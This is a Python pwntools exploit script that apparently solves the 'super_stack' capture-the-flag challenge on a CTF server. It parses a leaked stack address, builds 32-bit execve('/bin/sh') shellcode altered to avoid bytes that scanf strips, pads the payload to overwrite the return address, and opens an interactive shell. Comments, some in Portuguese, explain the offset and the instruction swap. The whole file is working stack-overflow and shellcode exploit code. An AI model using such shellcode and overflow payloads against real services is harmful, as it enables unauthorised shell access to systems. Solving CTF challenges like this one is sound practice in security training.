from pwn import *

local=False


NOP = "\x90"

if local:
    sh = process('./super_stack')
else:
    sh=remote("ctf.hackucf.org",9005)

# buff size: 108 bytes
buff_addr = sh.recv().replace("\n", "").split(":")[-1].strip()
ret_2_win_addr = p32(int(buff_addr, 16))
print(buff_addr)


shellcode = "\x48\x31\xd2"                                 
shellcode += "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" 
shellcode += "\x48\xc1\xeb\x08"                             
shellcode += "\x53"                                         
shellcode += "\x48\x89\xe7"                                 
shellcode += "\x50"                                         
shellcode += "\x57"                                         
shellcode += "\x48\x89\xe6"                                 
shellcode += "\xb0\x3b"  # 0xb0 is trimmed by scanf and cancels buffer override
shellcode += "\x0f\x05"

# using: https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
# to get the offset of eip to override

# to avoid the issue with scanf we replaced the bad instruction
# old instruction: mov    $0xb,%al -> mv 0xb (11) para al
# ou seja o equivalente a "zerar" aex e somar 11
# http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+eax%2C+eax%0D%0Ainc+eax&arch=x86-32&as_format=inline#assembly
# xor eax, eax  : \x31\xc0
# inc eax		: \x40

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xc0\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\xcd\x80"
payload = shellcode.ljust(112, "A") + ret_2_win_addr
#attach(sh)
sh.sendline(payload)
print(sh.recv())
# when we get a shell
sh.interactive()
